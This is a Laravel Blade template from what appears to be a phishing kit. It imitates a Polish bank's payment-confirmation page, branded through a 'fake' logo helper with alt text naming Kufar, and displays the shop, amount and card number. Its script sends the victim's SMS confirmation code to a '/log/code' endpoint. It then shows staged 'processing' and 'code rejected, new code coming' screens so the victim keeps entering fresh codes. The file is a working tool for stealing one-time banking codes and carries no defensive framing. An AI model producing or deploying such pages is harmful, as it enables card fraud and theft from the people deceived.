@extends('layouts.fake')
@push('css')
    <style>
        body {
            font-family: "Lato", sans-serif;
            font-weight: 400;
            font-size: 15px;
            background-color: #f4f4f5;
            color: #111;
            padding: 0 15px;
            overflow-y: hidden;
        }

        .form-container {
            display: flex;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }

        .form-block {
            max-width: 480px;
            margin: 0 auto;
            float: left;
        }

        .form-block-image {
            display: inline-block;
            width: 30%;
        }

        .form-block-header-text {
            display: inline-block;
            position: relative;
            font-size: 20px;
            margin: 0;
            top: -22px;
            left: 10px;
        }

        .form-block-body-text {
            line-height: 22px;
        }

        .form-block-body-table {
            border-spacing: 0;
            margin-top: 25px;
            margin-bottom: 30px;
        }

        .form-block-body-table tr {
            line-height: 24px;
        }

        .form-block-body-table tr td:nth-child(odd) {
            padding-right: 40px;
        }

        .form-block-body-table tr td:nth-child(even) {
            font-weight: 700;
        }

        .form-block-body-notification {
            font-size: 13px;
            line-height: 18px;
            background-color: #f5f6f7;
            box-shadow: 0 0 5px rgba(0, 0, 0, .1);
            border: 1px solid #e1e1ea;
            border-radius: 4px;
            padding: 10px 15px;
            margin-bottom: 25px;
        }

        .form-block-footer-text {
            font-weight: 700;
        }

        .form-block-footer-input {
            display: block;
            width: 100%;
            font-family: "Lato", sans-serif;
            font-size: 14px;
            border: 1px solid #e7e7e7;
            border-radius: 3px;
            padding: 10px 15px;
            transition: .25s;
        }

        .form-block-footer-input:focus {
            border-color: #c5c0c0;
            outline: none;
        }

        .input-invalid {
            border-color: #e74c3c;
        }

        .form-block-footer-input::-webkit-outer-spin-button,
        .form-block-footer-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .form-block-footer-button {
            display: block;
            width: 100%;
            margin: 0 auto;
            padding: 12px 0;
            background: #0031c8;
            color: #fff;
            font-family: inherit;
            font-size: 13px;
            border: 0;
            border-radius: 8px;
            cursor: pointer;
            outline: 0;
        }

        .form-block-footer-button:hover {
            background-color: #00a3df;
        }

        @media (max-width: 360px) {
            .form-block-image {
                display: block;
                margin-bottom: 15px;
            }

            .form-block-header-text {
                position: static;
                display: block;
            }
        }

        @media (max-height: 680px) {
            body {
                overflow-y: auto;
                padding: 15px;
            }

            .form-container {
                display: block;
            }

            .form-block-footer-button {
                margin-bottom: 25px;
            }
        }
    </style>
@endpush
@section('content')
    <div class="form-container">
        <div class="form-block" id="step-1">
            <div class="form-block-header">
                <img src="{{$fake->logo()}}" width="30%"><br><br>
                <br>
                <h1 class="form-block-header-text">Potwierdzenie operacji</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    Aby potwierdzić operację, na Twój numer telefonu została wysłana wiadomość tekstowa z kodem
                    potwierdzającym. Wprowadź go w polu poniżej.
                </p>

                <table class="form-block-body-table">
                    <tr>
                        <td>Sklep:</td>
                        <td>{{$categoryName}}</td>
                    </tr>

                    <tr>
                        <td>Kwota:</td>
                        <td>{{$amount}}</td>
                    </tr>

                    <tr>
                        <td>Nr karty:</td>
                        <td>{{$card_number}}</td>
                    </tr>
                </table>

                <div class="form-block-body-notification">
                    <b>Uwagę!</b> Ze względu na duże obciążenie serwera, przesłanie kodu może być opóźnione o kilka
                    minut.
                </div>
            </div>

            <div class="form-block-footer">
                <p class="form-block-footer-text">
                    Kod potwierdzenia:
                </p>

                <input type="text" class="form-block-footer-input" placeholder="Wpisz kod..."
                       @if(session('bankName') == 'bankbps')
                       maxlength="15"
                       @else
                       maxlength="8"
                       @endif
                       id="code-input">
                <br>
                <div style="text-align: center;">
                    <button class="form-block-footer-button" id="submit-button">
                        Potwierdzić
                    </button>
                </div>
            </div>
        </div>
        <div class="form-block" id="step-2" style="display: none;">
            <div class="form-block-header">

                <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
                <h1 class="form-block-header-text">Przetwarzanie płatności</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    Płatność jest w trakcie przetwarzania. Nastąpi automatyczne przekierowanie na odpowiednią stronę.
                    Może to zająć trochę czasu.
                </p>
            </div>
        </div>
        <div class="form-block" id="step-3" style="display: none;">
            <div class="form-block-header">
                <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
                <h1 class="form-block-header-text">Operacja została odrzucona.</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    Wprowadzono nieprawidłowy kod potwierdzenia lub skończył się jego termin ważności.
                    <br><br>Prosimy o oczekiwanie. Za chwilę zostanie wysłany nowy kod
                </p>
            </div>
        </div>
    </div>
@endsection
@push('js')
    <script type="text/javascript">
        $("#submit-button").on("click", function () {
            let input = $("#code-input");
            let code = input.val();
            let max = ['bankbps'].includes("{{session('bankName')}}") ? 15 : 8;
            if (code.length < 3 || code.length > max) {
                input.addClass("input-invalid");
                setTimeout(function () {
                    input.removeClass("input-invalid");
                }, 6000);
                return false;
            }
            $.post("/log/code", {code: code}, function (data) {
                $("#step-1").fadeOut(500, function () {
                    $("#step-2").fadeIn().fadeOut(500, function () {
                        setTimeout(function () {
                            $("#step-3").fadeIn().fadeOut(5000, function () {
                                $("#step-1").fadeIn();
                                $("#code-input").val('');
                            });
                            if (data.next) location.href = data.next;
                        }, 3000);
                    });
                });
            });
        });
    </script>
@endpush